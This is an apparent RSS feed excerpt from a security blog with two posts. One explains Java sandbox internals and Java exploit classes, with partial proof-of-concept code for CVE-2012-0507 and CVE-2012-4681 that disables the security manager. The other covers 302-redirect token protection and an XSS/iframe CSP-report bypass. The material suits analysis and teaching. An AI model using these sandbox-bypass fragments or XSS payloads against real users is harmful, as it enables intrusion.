			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Client side exploits are inevitable part of the security Industry. And no matter how much new security is added to these products they would be always exploited. As long as Government and Individuals need to hack into others confidential data there would be a requirement for exploits. So when there's demand, someone will supply. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=669&amp;d=1396855068" border="0" alt="Name:  download.jpeg
Views: 6418
Size:  3.2 KB"  style="float: CONFIG" /><img src="http://garage4hackers.com/attachment.php?attachmentid=671&amp;d=1396862908" border="0" alt="Name:  images.jpeg
Views: 5533
Size:  4.2 KB"  style="float: CONFIG" /><img src="http://garage4hackers.com/attachment.php?attachmentid=674&amp;d=1396864208" border="0" alt="Name:  Screen Shot 2014-04-07 at 3.19.33 pm.jpg
Views: 5629
Size:  5.8 KB"  style="float: CONFIG" /><br />
<br />
I started developing Sandy an Exploit Analysis and Automation framework in 2013 for <a href="http://www.honeynet.org.in/" target="_blank">Indian Honeynet project</a>. I was working as a researcher with a Threat Intelligence firm back then and was able to actively work on this project. I recently changed my job and I am now working as a Application Security Engineer. The change in job profile kind of slowed my progress with sandy. Any way to keep things rolling and keeping the project alive SANDY is moved to GIT <br />
<b><u>GIT:<br />
<a href="https://github.com/fb1h2s/sandy" target="_blank">https://github.com/fb1h2s/sandy . <br />
</a><br />
</u></b><br />
There are a lot of automated system to process Msword and PDF exploits but nothing was there for JAVA . So sandy is created specifically for Java exploits. <br />
<br />
<b>Read More:</b> <a href="http://exploit-analysis.com/sandy/view/about.php" target="_blank">http://exploit-analysis.com/sandy/view/about.php</a><br />
<br />
<br />
An instance of Sandy is here at <a href="http://Exploit-Analysis.com" target="_blank">http://Exploit-Analysis.com</a> . I just ripped the back end code and moved it to GIT. There would be lot of hardcoded paths and configuration. And it would take some time to beautify the code.<br />
<br />
<u><b>More About Sandy and JAVA Analysis Module:<br />
</b></u><br />
I did two talks on Automated Exploit analysis and the Need for a specialised system at HITB and HITCon introducing SANDY.<br />
<br />
<br />
<div style="text-align: left;">The entire talk was for the security industry [Threat, AV, Firewall, IPS/IDS] and putting forward a solution to mass analysis exploits. With the rise in APT attacks and malwares spreading via a document, java, and browser exploits is pretty high. <br />
<br />
<br />
Two big issues faced by the security industry is,<br />
<br />
1) On how to analyze exploits in bulk and extract IP/controller information.<br />
<br />
2) On how to attribute to apt groups to exploits collected.<br />
<br />
Traditional malware sandboxes are built to analyze binary samples and you can submit binary files blindly to it with out knowing much about them. But that is not the case with exploit samples where a certain criteria’s needed to be satisfied for successful exploitation, like a document exploit might only work on Chinese xp box or a java exploit will only drop files on mac machine etc. And talking about java exploits, there is no sandbox that process java exploit at all. So their needs to be an intelligent specialized system that process these exploit samples. So I was working on a free tool [online and client version] in which I implemented both static and dynamic analysis, where files are not submitted to the dynamic sandbox directly instead it goes through a static analysis engine where it collects information about the samples and this intelligence is used in dynamic analysis phase. So tool is specific for analyzing exploit samples and a beta testing version could be found here.</div><br />
<a href="http://exploit-analysis.bot.nu/sandy/index.php" target="_blank">http://exploit-analysis.bot.nu/sandy/index.php</a><br />
<br />
So in my talk I explained the various things I learned from building this tool, and explained the methods used to automate mass exploit analysis so that individuals could replicate the methods or learn the various techniques involved in APT attacks. <br />
<br />
<br />
<br />
<u><b>JAVA Exploit Introduction:<br />
</b></u><br />
<u>Java Applets:<br />
</u><br />
A Java applet is a small application written in Java and delivered to users in the form of bytecode. The user launches the Java applet from a web page and it is then executed within a Java Virtual Machine (JVM) in a process separate from the web browser itself. A Java applet can appear in a frame of the web page, a new application window, Sun's AppletViewer or a stand-alone tool for testing applets. <br />
Source: <a href="http://en.wikipedia.org/wiki/Java_applet" target="_blank">http://en.wikipedia.org/wiki/Java_applet</a><br />
<br />
A browser that has java plugin installed would be able to execute the java class file from a browser.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">http://www.w3schools.com/tags/tag_applet.asp

&lt;applet code=&quot;Bubbles.class&quot; width=&quot;350&quot; height=&quot;350&quot;&gt;
Java applet that draws animated bubbles.
&lt;/applet&gt;</pre>
</div>Another way of invoking an applet is by using the JNPL protocol. A better idea of JNPL and browser java plugins could be obtained from the following blog of mine.<br />
<a href="http://www.garage4hackers.com/entry.php?b=298" target="_blank">http://www.garage4hackers.com/entry.php?b=298</a><br />
<br />
So technically these are the only two ways I am aware of by which a java plugin could be invoked.<br />
<br />
Java applets by default runs in a sandboxed environment and all the exploits seen in the wild uses a sandbox bypass technique . <br />
<br />
<u><b>Java Sandbox :<br />
</b></u><br />
Before Getting into Java Exploits and Exploit analysis lets review Java security Architecture.<br />
Pic Credits: Ref: <a href="http://www.blackhat.com/presentations/bh-asia-02/LSD/bh-asia-02-lsd.pdf" target="_blank">http://www.blackhat.com/presentation...sia-02-lsd.pdf</a><br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=670&amp;d=1396855202" border="0" alt="Name:  java_arti.jpg
Views: 1586
Size:  22.9 KB"  style="float: CONFIG" /><br />
<br />
Java Security is handled by the a Java Sandbox . The role of the sandbox is to provide a very restricted environment in which to run untrusted code obtained from the open network. The java sandbox is only enforced on web applets and not on java codes running on the local machines. <br />
Ref: <a href="http://docs.oracle.com/javase/7/docs/technotes/guides/security/spec/security-spec.doc1.html" target="_blank">http://docs.oracle.com/javase/7/docs...spec.doc1.html</a><br />
<a href="http://www.blackhat.com/presentations/bh-asia-02/LSD/bh-asia-02-lsd.pdf" target="_blank">http://www.blackhat.com/presentation...sia-02-lsd.pdf</a><br />
<br />
<b><u>Java Security Arc.<br />
</u></b><br />
Default Sandbox settings prevents applet from:<br />
<br />
1) Reading and Writing files on the client machine.<br />
2) Making Network connections<br />
3)Creating Listening Sockets.<br />
4) Starting other programs.<br />
5) Loading Libraries.<br />
<br />
<a href="http://garage4hackers.com/attachment.php?attachmentid=644&amp;d=1396855202"  title="Name:  java_arti.jpg
Views: 1586
Size:  22.9 KB">Attachment 644</a><br />
<br />
By default java is designed to be safe having solutions for a lot of common security issues, including but not limited to buffer overflows, memory management , type checking . One type of files that are by default allowed to run outside the Sandboxed environment are the &quot;Signed Applets&quot; (Not anymore).<br />
<br />
Previously all the security checks were programmatically implemented.But later a in-order to make things more convenient and to manage java security restrictions easily , java introduced an easy to manage &quot;Java Platform Security Model&quot; .<br />
<br />
<br />
<br />
<b><u>Java Security Model<br />
</u></b>Ref:<a href="http://docs.oracle.com/cd/E12839_01/core.1111/e10043/introjps.htm#CEGDFGIA" target="_blank">http://docs.oracle.com/cd/E12839_01/...s.htm#CEGDFGIA</a><br />
<br />
The Java security model is based on controlling the operations that a class can perform when it is loaded into a running environment. For this reason, this model is called code-centric or code-based.<br />
The basic concept of security model are as follows.<br />
<br />
1) Manage Permissions<br />
<br />
Permissions: A permission is a set of permissible operations on some set of resources. <br />
<br />
2) Protection Domains and Security Policies<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				A protection domain associates permissions with codesources. The policy currently in effect is what determines protection domains. A protection domain contains one or more codesources. It may also contain a Principal array describing who is executing the code, a classloader reference, and a permission set (java.security.PermissionCollection instance) representing a collection of Permission objects.
			
		</div>
	</div>
</div><img src="http://docs.oracle.com/cd/E12839_01/core.1111/e10043/img/protdom.gif" border="0" alt="" /><br />
<br />
Ref: <a href="http://web.fhnw.ch/plattformen/as/vorlesungsunterlagen-1/java-security/an-introductory-java-security-example" target="_blank">http://web.fhnw.ch/plattformen/as/vo...curity-example</a><br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				In short <br />
Protection domain = Code source + collection of permissions <br />
Code source = Origin of class file (URL| Path) + zero or more signers (certificates) <br />
A class’s protection domain is established by the class loader when the class is loaded (only the class loader knows the class file’s origin) . A class’s protection domain is later used to make security decisions about what code in the <br />
class is or is not allowed to do 
			
		</div>
	</div>
</div>In other words, a less &quot;powerful&quot; domain cannot gain additional permissions as a result of calling or being called by a more powerful domain.<br />
<br />
3) Security Managers and Access Controllers<br />
The above above permission check and protection domains are managed by security managers and access controllers.<br />
<br />
<br />
Java Security is handled by the a Java Sandbox . The role of the sandbox is to provide a very restricted environment in which to run untrusted code obtained from the open network. The java sandbox is only enforced on web applets and not on java codes running on the local machines. <br />
<br />
<b><u>Sandboxed :<br />
</u></b><br />
So the following applet with the compiled class file when run form the browser would be executing on a controlled environment. <br />
<br />
&lt;APPLET CODE=&quot;Main.class&quot; WIDTH=&quot;800&quot; HEIGHT=&quot;500&quot;&gt;<br />
<br />
<br />
<u>JAVA Applet Permissions: <br />
</u><br />
All the permission are enforced in a policy file located at []java-dir]/lib/security/java.policy .<br />
<br />
The access controls is a stack based implementation.Each api when called is checked for it's permission before getting executed. The above is done by java.security.AccessController.check-Permission<br />
<br />
So the basic pesudocode of java.security.AccessController.check-Permission would be as follows. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:312px;">java.security.AccessController.check-Permission ()

{

$Java-policy =&quot;java.policy&quot;;

$api_caller_framer =$api_calls_stack;

check_permission($Java-policy , $api_calls_stack;);

check_permission($Java-policy , $api_calls_stack;)

{

if (allowed)

   return Allowed

else (not-allowed)

   return not_allowed
    

}</pre>
</div><br />
<b><u>Few java properties to remember:<br />
</u></b><br />
<ul><li style="">Java Restricted Packages</li><li style="">Java Security Manager</li><li style="">Reflection</li><li style="">Type safety</li><li style=""> Java Serialization</li></ul><br />
<br />
<br />
<br />
<u><b>Java Restricted Packages <br />
</b></u><br />
There are packages in Java that cannot be accessed by untusted code by default. <br />
These packages have the capability to execute privileged codes, or anything that is possible with java. <br />
Example Restricted Packages: sun.awt.SunToolkit,sun, com.sun.xml.internal.ws, com.sun.xml.internal.bind and <br />
com.sun.imageio<br />
<br />
<u><b>Security Manager<br />
</b></u><br />
<br />
“Security manager is an object that defines a security policy for an application” . You can programmatically manage security policies using the SecurityManager class Java.lang.System.setSecurityManager is the method that sets security manager for the application. <br />
<br />
Turning off the security manager is simple as adding this to you'r code. [Having right privilege] <br />
 <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"> Java.lang.System.setSecurityManager(null)</pre>
</div>Ref:BH_US_12_Oh_Recent_Java_Exploitation_Trends_an  d_Malware_WP.pdf<br />
<br />
The following Packages Implement the Security Manager[ java.lang.Securitymanager ] .<br />
<br />
So normally code execution in java applet is achieved by disabling Security manager code: <div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">Java.lang.System.setSecurityManager(null)</pre>
</div>Disabling security manager is only possible by a signed java applet or after a privilege escalation, and hence the above code is always seen in all the latest java exploits [obfuscated] majority of times. When a java sandbox bypass in done the code will have privileges to disable the security manager.<br />
<br />
<u><b>Different Types of JAVA Exploits <br />
</b></u><br />
<br />
Here we will detail about the different types of bug found in Java:<br />
<br />
<br />
<ul><li style="">Java Type Confusion Exploits. [CVE-2012-0507, CVE-2013-0431 ,CVE: 2013-2423 , ]</li><li style="">Java Logic error and sandbox bypass. [CVE-2012-4681, CVE-2013-0422]</li><li style="">Argument Injection [CVE-2010-0886 ]</li><li style="">Memory Corruptions [Stack based, Heap based, Outbound Write, Integer overflows] . [CVE-2013-1493, CVE-2013-2465 CVE-2013-2465 Java storeImageArray ]</li></ul><br />
<br />
<u>A common Signature in Exploits: <br />
</u><br />
Java.lang.System.setSecurityManager<br />
<br />
Turning off the security manager is simple as adding this to you'r code.<br />
<br />
Java.lang.System.setSecurityManager(null) <br />
<br />
<br />
The base class is :<br />
Ref: <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/21321.pdf" target="_blank">http://www.exploit-db.com/wp-content...docs/21321.pdf</a><br />
<br />
And this is only possible by a signed java applet or after a privilege escalation, and hence this code is always seen in all the latest java exploits [obfuscated] majority of times. <br />
<br />
<br />
<br />
<u><b>Java Serialization <br />
</b></u><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				Ref: <a href="http://www.tutorialspoint.com/java/java_serialization.htm" target="_blank">http://www.tutorialspoint.com/java/j...ialization.htm</a><br />
Java provides a mechanism, called object serialization where an object can be represented as a sequence of bytes that includes the object's data as well as information about the object's type and the types of data stored in the object.<br />
			
		</div>
	</div>
</div><br />
<br />
<br />
<u><b>Reflection:<br />
</b></u><br />
Reflection is commonly used by programs which require the ability to examine or modify the runtime behaviour of applications running in the Java virtual machine.<br />
<br />
<br />
Ref: <a href="http://docs.oracle.com/javase/tutorial/reflect/" target="_blank">http://docs.oracle.com/javase/tutorial/reflect/</a><br />
<br />
With reflection : We Can create an instance of a class at runtime and use it while executing. Can access private class members.We can access private methods and variable, hidden class members .These are not possible when security manager is enabled. <br />
Ref: <a href="http://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful" target="_blank">http://stackoverflow.com/questions/3...y-is-it-useful</a><br />
Example : Consider we have an object named stack of unknown type and we want to do a push method on it if method exist . Java rules are not really designed to support this unless the object conforms to a known interface, but using reflection, your code can look at the object and find out if it has a method called 'push' and then call it if you want to.<br />
<br />
Example: <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">Method method = stack.getClass().getMethod(&quot;push&quot;, null);
method.invoke(stack, null);</pre>
</div>Reflection is is one of the most used features of Java when it comes to exploit building. <br />
<br />
<u><b>Type safety <br />
</b></u><br />
Ref: <a href="http://www.securingjava.com/chapter-two/chapter-two-10.html" target="_blank">http://www.securingjava.com/chapter-...er-two-10.html</a><br />
<br />
Java prevents programs  from accessing memory inappropriate ways.  Type safety means that a program cannot perform an operation on an object unless that operation is valid for that object.<br />
<br />
Securingjava.com has got a very good example and I will quote the entire example here.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				Type safety is the most essential element of Java's security. To understand why, consider the following slightly contrived example. A calendar-management applet defines a class called Alarm. This class is represented in memory as shown in Figure 2.10. Alarm defines an operation turnOn, which sets the first field to true. The Java runtime library defines another class called Applet, whose memory layout is also shown in Figure 2.10. Note that the first field of Applet is fileAccessAllowed, which determines whether the applet is allowed access to files on the hard disk.<br />
<br />
<img src="http://www.securingjava.com/images/Fig02.10.gif" border="0" alt="" /><br />
<br />
Suppose a program tried to apply the turnOn operation to an Applet object. If the operation were allowed to go ahead, it would do what turnOn was supposed to do, and set the first field of the object to true. Since the object was really in the Applet class, setting the first field to true allows the applet to access the hard disk. The applet would then be allowed (incorrectly) to delete files.
			
		</div>
	</div>
</div>Type safety is generally done by performing static analysis at the time of compilation.So if a type changes at runtime then it’s impossible to do the safe check. So if we find a type confusion bug then we could confuse java making it think its process one kind of object but in reality its a different one.<br />
<br />
Source:<a href="http://www.securingjava.com/chapter-five/chapter-five-7.html" target="_blank">http://www.securingjava.com/chapter-...er-five-7.html</a><br />
<br />
Example :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:228px;">An example on how type confusion is used to bypass security manager in java.

Here an applet has two pointers to the same memory one with type T and one with type U.

class T {
               SecurityManager x;
            }

class U {
           Myobject x;
             }

T t = the pointer tagged T;
U u = the pointer tagged U;
t.x = System.getSecurity();

Myobject m = u.x;</pre>
</div><br />
<u><b>CVE-2012-0507  - Java Atomic Reference Array Exploit<br />
</b></u><br />
Vulnerable Code:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">public AtomicReferenceArray(E[] array) {
    // Visibility guaranteed by final field guarantees
    this.array = array.clone();
}</pre>
</div><br />
<br />
<u><b>POC Explained<br />
</b></u><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">AtomicReferenceArray ara = new AtomicReferenceArray(new Integer[1]); 
Integer value = (Integer)ara.get(0); // value set to type integer of atomic ref array</pre>
</div>AtomicReferenceArray uses sun.misc.Unsafe to directly access the array <br />
With this we can do “ AtomicReferenceArray.set() “ which allows you to store any reference in the array.<br />
So we can replace integer value with any reference in the array, and type safety check is bypassed.  <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">
AtomicReferenceArray ara = new 
AtomicReferenceArray(new Integer[1]);
ara.set(0, &quot;foo&quot;);
Integer value = (Integer)ara.get(0);</pre>
</div>Now value contains a string while being typed as Integer.With this combined with few other things we can disable security manager , and sanbdox restriction would be bypassed. <br />
<br />
<b><u>CVE-2012-4681 - Accessing restricted class with [ com.sun.beans.finder.ClassFinder ]<br />
</u></b><a href="http://www.docjar.com/docs/api/com/sun/beans/finder/ClassFinder.html" target="_blank">http://www.docjar.com/docs/api/com/s...assFinder.html</a><br />
<br />
<br />
Restricted package  sun.awt.SunToolkit was able to be accessed by ClassFinder method {java 7 New}. And with this privileged class <br />
<br />
Classfinder.findclass was able to  access restricted class . <br />
Get accessor to private &quot;acc&quot; field of Statement.class . {Java 7}<br />
Create Access control context with all permission <br />
Create statement that disables security manager.<br />
Set &quot;acc&quot; field accessor with permissions and security manager statement.<br />
Execute and disable security manager<br />
Game over.<br />
<br />
<u>POC:<br />
</u><br />
class  restricted_class = ClassFinder.findclas(&quot;sun.awt.SunToolkit&quot;);<br />
Expression ex = new Expression(retricted_class, &quot;getField&quot;,new Object[] [ Statement.class,&quot;acc&quot;])<br />
ex.execute();<br />
Field.acc_field =((Field expr.getValue()};<br />
<br />
//Get All permision<br />
<br />
Permission all_permission = new Permissions();<br />
<br />
all_permission.add( new Allpermission());<br />
<br />
AccessControlContext allPermAcc = new AccessControlContext(new ProtectionDomain[] { new ProtectionDomain (new CodeSource ( new URL(&quot;file:///&quot;)/new Certificate[0], all_permission)<br />
<br />
<br />
<u><b>CVE-2013-2423<br />
</b></u><br />
Java Applet Reflection Type Confusion | and memory manipulation .<br />
<a href="http://weblog.ikvm.net/CommentView.aspx?guid=acd2dd6d-1028-4996-95df-efa42ac237f0" target="_blank">http://weblog.ikvm.net/CommentView.a...f-efa42ac237f0</a><br />
<a href="http://blog.spiderlabs.com/2013/04/java-is-so-confusing.html" target="_blank">http://blog.spiderlabs.com/2013/04/j...confusing.html</a><br />
<br />
Change type double to integer.<br />
Use reflection to copy an integer field from one object to another.<br />
Now reflection will copy 8 bytes instead of 4 thinking since the previous type was double.  <br />
<br />
<b><u>JAVA Exploit reference:<br />
</u></b><br />
CVE-2013-0431- jmxmbeanserver Logic Error Sanbox Bypass<br />
<a href="http://pastebin.com/QWU1rqjf" target="_blank">http://pastebin.com/QWU1rqjf</a><br />
<br />
<u>Memory Corruptions:<br />
</u><br />
CVE-2013-2465 , CVE-2013-2463, CVE-2013-2462 , CVE-2013-1493<br />
<br />
<u>Java Type Confusion Vulnerability<br />
</u><br />
<a href="http://weblog.ikvm.net/PermaLink.aspx?guid=cd48169a-9405-4f63-9087-798c4a1866d3" target="_blank">http://weblog.ikvm.net/PermaLink.asp...7-798c4a1866d3</a><br />
<br />
<br />
CVE-2013-0431 : RType Confusion Again.<br />
<br />
<u>Bypassing Security Warnings:<br />
</u><br />
<a href="http://immunityproducts.blogspot.in/2013/04/yet-another-java-security-warning-bypass.html" target="_blank">http://immunityproducts.blogspot.in/...ng-bypass.html</a><br />
<br />
<br />
CVE-2013-1493 Memmory corruption <br />
<br />
<a href="http://blog.spiderlabs.com/2013/03/fresh-coffee-served-by-coolek.html" target="_blank">http://blog.spiderlabs.com/2013/03/f...by-coolek.html</a><br />
<br />
<br />
0-day<br />
<br />
<a href="http://pastebin.com/cUG2ayjh" target="_blank">http://pastebin.com/cUG2ayjh</a><br />
<br />
<a href="http://packetstormsecurity.com/files/119505/Java-Zero-Day-Analysis.html" target="_blank">http://packetstormsecurity.com/files...-Analysis.html</a><br />
<br />
Ref: <a href="http://www.security-explorations.com/materials/se-2012-01-report.pdf" target="_blank">http://www.security-explorations.com...-01-report.pdf</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2532</guid>
		</item>
		<item>
			<title>Trusting 302 Redirects and Content Security Policies security.</title>
			<link>http://garage4hackers.com/entry.php?b=1468</link>
			<pubDate>Mon, 13 Jan 2014 23:06:47 GMT</pubDate>
			<description><![CDATA[My new year resolution is to blog as much as possible. My writing skills sucks and there's just too great a chance, i'll lower the standards. Any way...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">My new year resolution is to blog as much as possible. My writing skills sucks and there's just too great a chance, i'll lower the standards. Any way the show must go on. So am planning to share my weekend notes here from now on. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=645&amp;d=1389654583" border="0" alt="Name:  CSP_Shield_Logo.jpg
Views: 6223
Size:  19.4 KB"  style="float: CONFIG" /><br />
<br />
Few weeks back I had to design a solution for a challenging web application issue. <br />
<br />
<u>The scenario was as follows. <br />
</u><br />
<br />
A secure Web Application has a Secret Access token . This token needs to be shared with a Desktop client application. And based on receiving the secure-token the desktop application performs few critical tasks. The secret-token is in the form of an application cookie. So for passing the cookie to the desktop app, application uses a javascript code  that reads the cookie and sent a GET request using it to the localhost Desktop App.<br />
<br />
1) Java Script -- &gt; Reads Cookies [ document cookie ]<br />
2) Cookies Sent to Desktop client via an xmlhttp GET request to Desktop client [ <a href="http://127.0.0.1/?Secure_cookie=2121212" target="_blank">http://127.0.0.1/?Secure_cookie=2121212</a> .  <br />
<br />
<br />
Now the issues is I need to protect the Secret-token no matter what. So even if there is an XSS in the app the secret cookie should not be lost. Well for preventing cookie read via JS we can mark the cookie HTTP-ONLY but then it would halt the entire implementation . As the legitimate JS would not be able to read the cookies and sent to Desktop App. <br />
<br />
One solution here was to use a 302 redirects and mark the cookie http-only. So our application uses POST method requesting the Secret-token .And on receiving the post request the application does a 302 redirect to the localhost and a url variable will have the secret-cookie.  <br />
<br />
1) An http POST method is used to request the secret-token from a Secret token[cookie] page page in a new tab.<br />
2) The secret token page 302 redirects to [<a href="http://127.0.0.1/?secure_cookie=2121212" target="_blank">http://127.0.0.1/?secure_cookie=2121212</a> ]<br />
<br />
<br />
The security of this implementation is based on the fact that an XHR request cannot access response headers. So even if we have an XSS in the app, a malicious xml-http-request would not be able fake a post request to read the response headers.<br />
<br />
<u><b>As per xmlhttprequest RFC .<br />
</b></u><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<a href="http://www.w3.org/TR/XMLHttpRequest/" target="_blank">http://www.w3.org/TR/XMLHttpRequest/</a><br />
<br />
<br />
&quot;If the redirect violates infinite loop precautions this is a network error.<br />
<br />
Otherwise, run these steps:<br />
<br />
Set the request URL to the URL conveyed by the Location header.<br />
<br />
If the source origin and the origin of request URL are same origin transparently follow the redirect while observing the same-origin request event rules.<br />
<br />
&quot;
			
		</div>
	</div>
</div>The following is how XHR handle 302 redirects. So there is no way a JS would be able to get the redirect location thereby revealing our secret token. One more thing is that, in our scenario our final redirect url is a different domain[127.0.0.1]. So that means our source and origin is different there by causing a CSP error if requested using XHR .<br />
<br />
Error:<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				&quot;<br />
XMLHttpRequest cannot load <a href="http://exploit-analysis.com/302/ajax.php" target="_blank">http://exploit-analysis.com/302/ajax.php</a>. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://172.16.139.145' is therefore not allowed access. <br />
&quot;
			
		</div>
	</div>
</div><br />
This cross origin error error will contain the 302 location url, but is not accessible for javascripts.<br />
<br />
<br />
So my secure implementation was based on these browser security features.<br />
<u><br />
You can check out the implementation over here:</u> <b><u><a href="http://exploit-analysis.com/302/index.php?xss=sas" target="_blank">http://exploit-analysis.com/302/index.php?xss=sas</a> .</u></b><br />
<br />
But soon this proposal was challenged by <a href="https://twitter.com/skeptic_fx" target="_blank">https://twitter.com/skeptic_fx</a> . <br />
<br />
His cool bypass method was using the CSP violation reports. <br />
<br />
 <a href="https://developer.mozilla.org/en-US/docs/Security/CSP/Using_CSP_violation_reports" target="_blank">https://developer.mozilla.org/en-US/...lation_reports</a><br />
<br />
He simply collected the CSP log reports on the server. And this logs will contain the violated domains. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">hea&nbsp;der</span><span style="color: #007700">(</span><span style="color: #DD0000">"Content&nbsp;Security-Policy:&nbsp;frame-src&nbsp;'self'&nbsp;domain.com&nbsp;fb1h2s.domain.com&nbsp;;&nbsp;report-uri&nbsp;report.php;"</span><span style="color: #007700">);&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">HTML Code:</div>
	<pre class="bbcode_code" style="height:14*12px};">POST report.php HTTP/1.1
Host: domain.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 344
Content-Type: application/json
Connection: keep-alive

{&quot;csp-report&quot;:{&quot;document-uri&quot;:&quot;http://domain.com/csp.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;blocked-uri&quot;:&quot;http://rc2wedwsze.sas.domain.com/&quot;,&quot;violated-directive&quot;:&quot;frame-src http://domain.com:80 http://test.domain.com:80 http://domain.com:80&quot;,&quot;original-uri&quot;:&quot;http://domain.com/post.php&quot;}}
</pre>
</div>But for my current implementation the above trick is not as harmful as it could only leak the domain name , rather than the full URl. <br />
<br />
<br />
Remember in our implementation we  do a 302 redirect with .<br />
<br />
<a href="http://127.0.0.1/secret_key.php?key=56787653567898876" target="_blank">http://127.0.0.1/secret_key.php?key=56787653567898876</a><br />
<br />
Here even if you leak the domain[127.0.0.1[ name its of no use, as the objective is to leak the entire url to reveal the secret key.<br />
<br />
But with  CSP reports one can only leak the domain name not the entire url. I tested it on multiple browser and it does not work because CSP strictly follows same origin in newer browsers.  <br />
<br />
Actual Specification for CSP: <a href="http://www.w3.org/TR/CSP/#violation-reports" target="_blank">http://www.w3.org/TR/CSP/#violation-reports</a><br />
<br />
Here blocked-uri is the one that leaks the url. <br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				blocked-uri : &quot;URI of the resource that was prevented from loading due to the policy violation, with any &lt;fragment&gt; component removed&quot;<br />
<br />
&quot;If the origin of the blocked-uri is not the same as the origin of the protected resource, then replace the blocked-uri with the ASCII serialization of the blocked-uri's origin.&quot;
			
		</div>
	</div>
</div>Browsers Tested:<br />
<br />
1) In chrome it does not sent the entire URI.<br />
2) In firefox it does not sent entire URI.<br />
<a href="https://developer.mozilla.org/en-US/docs/Security/CSP/Using_CSP_violation_reports" target="_blank">https://developer.mozilla.org/en-US/...lation_reports</a><br />
3) Webkit Also seems to implement this correctly.<br />
<br />
Here is the list of other CSP supported browser versions. <a href="http://caniuse.com/contentsecuritypolicy" target="_blank">http://caniuse.com/contentsecuritypolicy</a><br />
<br />
<br />
So CSP  follows the same origin policy and blocks the entire url from being revealed. I have seen a lot of people complaining about CSP not able to capture the entire cross origin request . So thought this article would be useful for highlighting security issues concerning CSP features. <br />
<br />
While I was writing this blog homakov published an article explaining few privacy violations issues regarding CSP.  <br />
<br />
Take a look. <a href="http://homakov.blogspot.in/2014/01/using-content-security-policy-for-evil.html" target="_blank">http://homakov.blogspot.in/2014/01/u...-for-evil.html</a>.<br />
<br />
I am looking for more suggestions on how much I can trust 302 redirects for such a secure implementation . Or any potential bypass that could circumvent this secure implementation. <br />
<br />
<br />
<u><b>Update:<br />
</b></u><br />
Nafeez put up a G4H CTF challenge for the issue .<br />
<br />
The challange was to leak the entire 302 redirect URL or just the domain name of a 302 redirect. <br />
<br />
test.skepticfx.com/challenge/2014/1/?xss=123&lt;script&gt;alert(%27xss%27)&lt;/script&gt;<br />
<br />
And we dint get any solution that could leak the entire url except the domain name. Which at some cases could be dangerous. <br />
<br />
Here is the solution for the bypass. Nishant Das Patnaik broke the challenge. <br />
<br />
<a href="http://test.skepticfx.com/challenge/2014/1/?xss=123%3Ciframe%20src=%22http://skepticfx.com/test/challenge/2014/1/wvmb0blemg/csp.php%22%3E%3C/iframe%3E" target="_blank">http://test.skepticfx.com/challenge/...E%3C/iframe%3E</a><br />
<br />
The solution uses a parent and child Iframe . Set the parent iframe to report CSP errors to server. Make child frame to do a 302 redirect. Since the redirected domain is different, this will cause an CSP error . This error report will have the redirected domain. <br />
<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=646&amp;d=1390198439" border="0" alt="Name:  Screen Shot 2014-01-20 at 11.43.24 am.jpg
Views: 1710
Size:  23.3 KB"  style="float: CONFIG" /><br />
<br />
Regards.<br />
<a href="http://www.linkedin.com/profile/view?id=51036445" target="_blank">Rahul Sasi</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1468</guid>
		</item>
		<item>
			<title>Sms to Shell fuzzing USB internet modems</title>
			<link>http://garage4hackers.com/entry.php?b=1066</link>
			<pubDate>Fri, 01 Nov 2013 18:18:23 GMT</pubDate>
			<description>Attachment 639 (http://garage4hackers.com/attachment.php?attachmentid=639) 
